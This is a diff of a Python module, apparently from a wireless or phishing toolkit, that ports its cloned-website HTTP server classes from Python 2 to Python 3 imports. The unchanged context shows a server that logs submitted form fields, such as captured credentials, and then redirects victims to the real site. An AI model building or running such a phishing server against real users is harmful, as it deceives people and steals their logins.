@@ -1,24 +1,21 @@
 from PyQt4.QtCore import QThread,pyqtSignal
 from core.utils import setup_logger
 from core.utility.constants import LOG_PHISHING
-import SimpleHTTPServer
-import BaseHTTPServer
-import SocketServer
+from http.server import SimpleHTTPRequestHandler,HTTPServer
 import threading
-import urllib2
 import logging
 import socket
 import cgi
 
 
-class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class ServerHandler(SimpleHTTPRequestHandler):
     ''' server http for website clone module Phishing'''
     redirect_Original_website,redirect_Path = None,None
     def do_GET(self):
         self.log_message('',"Connected : %s" %(self.address_string()))
         if self.path =='/':self.path = self.redirect_Path
         if self.path.startswith('/'): self.path = self.redirect_Path + self.path
-        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+        SimpleHTTPRequestHandler.do_GET(self)
 
     def log_message(self, format, *args):
         return
@@ -46,29 +43,29 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                 self.log_message('',item.name+' : '+item.value)
         if redirect:
             self.redirect(self.redirect_Original_website)
-        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+        SimpleHTTPRequestHandler.do_GET(self)
 
-class ServerPhishing(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class ServerPhishing(SimpleHTTPRequestHandler):
     ''' server http for website clone module Phishing'''
     redirect_Path = None,None
     def do_GET(self):
         self.log_message('',"Connected : %s" %(self.address_string()))
         if self.path =='/':self.path = self.redirect_Path
         if self.path.startswith('/'): self.path = self.redirect_Path + self.path
-        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+        SimpleHTTPRequestHandler.do_GET(self)
 
     def log_message(self, format, *args): return
 
-class MyHTTPServer(BaseHTTPServer.HTTPServer):
+class MyHTTPServer(HTTPServer):
     ''' by: Piotr Dobrogost callback for start and stop event '''
     def __init__(self, *args, **kwargs):
         self.on_before_serve = kwargs.pop('on_before_serve', None)
-        BaseHTTPServer.HTTPServer.__init__(self, *args, **kwargs)
+        HTTPServer.__init__(self, *args, **kwargs)
 
     def serve_forever(self, poll_interval=0.5):
         if self.on_before_serve:
             self.on_before_serve(self)
-        BaseHTTPServer.HTTPServer.serve_forever(self, poll_interval)
+        HTTPServer.serve_forever(self, poll_interval)
 
 class ThreadHTTPServerPhishing(QThread):
     ''' server http for website  module::UpdateFake'''
